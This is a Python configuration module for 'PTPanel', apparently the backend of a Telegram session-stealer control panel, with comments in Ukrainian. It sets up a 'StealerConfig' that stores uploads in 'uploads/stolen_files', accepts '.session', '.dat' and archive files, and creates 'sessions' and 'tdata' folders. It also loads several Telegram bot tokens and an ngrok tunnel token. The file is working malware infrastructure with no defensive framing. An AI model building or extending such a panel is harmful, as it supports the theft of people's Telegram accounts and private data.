# config.py
import os
import logging
import sys
from dataclasses import dataclass
from typing import List, Optional

# Fix Unicode encoding for Windows
if sys.platform == "win32":
    import codecs
    if hasattr(sys.stdout, 'buffer'):
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
    if hasattr(sys.stderr, 'buffer'): 
        sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')

# Load environment variables
from dotenv import load_dotenv
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/app.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger(__name__)

@dataclass
class DatabaseConfig:
    url: str
    pool_size: int = 20
    max_overflow: int = 30
    echo: bool = False
    pool_pre_ping: bool = True

@dataclass
class TelegramConfig:
    api_id: int
    api_hash: str
    bot_tokens: List[str]
    phone: Optional[str] = None

@dataclass
class AdminConfig:
    username: str
    password: str
    session_timeout: int = 3600
    max_login_attempts: int = 5
    cookie_secure: bool = False

@dataclass
class ServerConfig:
    host: str
    port: int
    debug: bool
    secret_key: str
    app_name: str = "PTPanel"
    upload_limit: int = 100 * 1024 * 1024

@dataclass
class StealerConfig:
    encryption_key: str
    max_file_size: int = 50 * 1024 * 1024
    upload_dir: str = "uploads/stolen_files"
    allowed_extensions: List[str] = None

    def __post_init__(self):
        if self.allowed_extensions is None:
            self.allowed_extensions = ['.txt', '.zip', '.session', '.json', '.dat']

@dataclass
class PathConfig:
    templates_dir: str = "templates"
    static_dir: str = "static"
    uploads_dir: str = "uploads"
    logs_dir: str = "logs"
    sessions_dir: str = "uploads/sessions"
    tdata_dir: str = "uploads/tdata"

@dataclass
class LoggingConfig:
    level: str = "INFO"
    format: str = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    file: str = "logs/ptpanel.log"
    max_bytes: int = 10 * 1024 * 1024
    backup_count: int = 5

class PTPanelConfig:
    def __init__(self):
        # Database - тільки з .env
        self.db = DatabaseConfig(
            url=os.getenv('DATABASE_URL'),
            echo=os.getenv('DEBUG', 'False').lower() == 'true'
        )
        
        # Telegram - тільки з .env
        self.telegram = TelegramConfig(
            api_id=int(os.getenv('API_ID')),
            api_hash=os.getenv('API_HASH'),
            bot_tokens=self._parse_bot_tokens(),
            phone=os.getenv('PHONE_NUMBER')
        )
        
        # Admin - тільки з .env
        self.admin = AdminConfig(
            username=os.getenv('ADMIN_USERNAME'),
            password=os.getenv('ADMIN_PASSWORD'),
            cookie_secure=os.getenv('DEBUG', 'False').lower() != 'true'
        )
        
        # Server - тільки з .env
        self.server = ServerConfig(
            host=os.getenv('HOST'),
            port=int(os.getenv('PORT')),
            debug=os.getenv('DEBUG', 'False').lower() == 'true',
            secret_key=os.getenv('SECRET_KEY'),
            app_name="PTPanel"
        )
        
        # Stealer - тільки з .env
        self.stealer = StealerConfig(
            encryption_key=os.getenv('ENCRYPTION_KEY'),
            upload_dir='uploads/stolen_files'  # Фіксоване значення
        )
        
        # Paths
        self.paths = PathConfig()
        
        # Logging
        self.logging = LoggingConfig()
        
        # Ngrok
        self.ngrok_auth_token = os.getenv('NGROK_AUTH_TOKEN')
        self.ngrok_domain = os.getenv('NGROK_DOMAIN')
        
        # Validate configuration
        self._validate_config()
        
        # Create necessary directories
        self._create_directories()
        
        # Setup logging
        self._setup_logging()
        
        # Print config info
        self._print_config_info()
    
    def _parse_bot_tokens(self) -> List[str]:
        """Parse bot tokens from separate environment variables"""
        tokens = []
        
        # Список всіх ботів
        bot_vars = [
            'BOT_WEBAPP_TOKEN',
            'BOT_CLASSIC_TOKEN', 
            'BOT_MULTITOOL_TOKEN',
            'BOT_ADMIN_TOKEN'
        ]
        
        for bot_var in bot_vars:
            token = os.getenv(bot_var)
            if token and ':' in token:
                tokens.append(token)
                logger.info(f"Loaded token for {bot_var}")
            elif token:
                logger.warning(f"Invalid token format for {bot_var}")
        
        return tokens
    
    def _validate_config(self):
        """Validate configuration and log warnings"""
        if not self.telegram.api_id or not self.telegram.api_hash:
            logger.warning("Telegram API ID or HASH not set. Some features may not work.")
        
        if not self.telegram.bot_tokens:
            logger.warning("No bot tokens configured. Bot features will be disabled.")
        
        if self.server.debug:
            logger.warning("DEBUG mode is enabled. Do not use in production!")
        
        if len(self.server.secret_key) < 16:
            logger.warning("SECRET_KEY is too short. Consider using a longer key.")
        
        if len(self.stealer.encryption_key) < 32:
            logger.warning("ENCRYPTION_KEY is too short. Using default may be insecure.")
    
    def _create_directories(self):
        """Create necessary directories if they don't exist"""
        directories = [
            self.paths.uploads_dir,
            self.stealer.upload_dir,
            'uploads/sessions',
            'uploads/tdata',
            self.paths.logs_dir
        ]
        
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
            logger.debug(f"Created directory: {directory}")
    
    def _setup_logging(self):
        """Setup application logging"""
        import logging.handlers
        
        # Create logger
        logger = logging.getLogger('ptpanel')
        logger.setLevel(getattr(logging, self.logging.level))
        
        # Remove existing handlers
        for handler in logger.handlers[:]:
            logger.removeHandler(handler)
        
        # Formatter
        formatter = logging.Formatter(self.logging.format)
        
        # File handler with UTF-8 encoding
        file_handler = logging.handlers.RotatingFileHandler(
            self.logging.file,
            maxBytes=self.logging.max_bytes,
            backupCount=self.logging.backup_count,
            encoding='utf-8'
        )
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
        
        # Console handler
        if self.server.debug:
            console_handler = logging.StreamHandler(sys.stdout)
            console_handler.setFormatter(formatter)
            logger.addHandler(console_handler)
    
    def _print_config_info(self):
        """Print configuration information"""
        print(f">>> PTPanelConfig - Using DATABASE_URL: {self.db.url}")
        print(f">>> Loaded {len(self.telegram.bot_tokens)} bot tokens")
        if not self.telegram.bot_tokens:
            print(">>> WARNING: No bot tokens configured. Bot features will be disabled.")
        if self.server.debug:
            print(">>> WARNING: DEBUG mode is enabled. Do not use in production!")

# Global config instance
config = PTPanelConfig()